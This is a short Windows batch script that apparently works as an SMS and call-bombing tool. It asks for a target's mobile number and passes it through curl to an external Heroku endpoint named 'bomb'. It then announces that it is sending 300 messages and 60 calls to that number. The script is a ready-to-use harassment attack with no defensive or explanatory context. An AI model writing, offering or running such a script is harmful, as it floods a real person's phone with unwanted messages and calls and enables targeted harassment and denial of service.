set /p target="enter mobile number"
curl http://xlr81.herokuapp.com/bomb/%target%
echo "bombing 300msgs and 60 calls on %target%"
